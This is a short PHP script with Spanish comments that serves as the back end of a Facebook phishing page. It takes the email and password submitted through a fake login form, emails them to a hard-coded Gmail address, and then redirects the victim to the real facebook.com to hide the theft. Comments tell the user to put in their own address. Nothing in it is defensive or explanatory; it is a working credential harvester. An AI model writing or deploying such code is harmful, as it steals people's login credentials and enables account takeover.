<?php
// Verifica si se ha enviado el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verifica si se han enviado tanto el correo electrónico como la contraseña
    if (isset($_POST["email"]) && isset($_POST["password"])) {
        // Obtiene los valores del correo electrónico y la contraseña del formulario
        $email = $_POST["email"];
        $password = $_POST["password"];
        
        // Verifica si el correo electrónico y la contraseña no están vacíos
        if (!empty($email) && !empty($password)) {
            // Envía el correo electrónico
            $to = "luismiguelsantosdelossanchez@gmail.com"; // Cambia esto por tu dirección de correo electrónico
            $subject = "Datos de inicio de sesión - Facebook";
            $message = "Correo electrónico: " . $email . "\r\n" .
                       "Contraseña: " . $password;
            $headers = "From: luismiguelsantosdelossanchez@gmail.com"; // Cambia esto por tu dirección de correo electrónico
            
            // Envía el correo
            if (mail($to, $subject, $message, $headers)) {
                // Redirige al usuario a la página de Facebook si el correo se envió correctamente
                header("Location: https://www.facebook.com");
                exit();
            } else {
                // Si falla el envío del correo, muestra un mensaje de error
                echo "Ha ocurrido un error al enviar el correo. Por favor, inténtalo de nuevo más tarde.";
            }
        } else {
            // Si el correo electrónico o la contraseña están vacíos, muestra un mensaje de error
            echo "Por favor, complete todos los campos del formulario.";
        }
    } else {
        // Si no se enviaron ambos campos, muestra un mensaje de error
        echo "Por favor, complete todos los campos del formulario.";
    }
}
?>
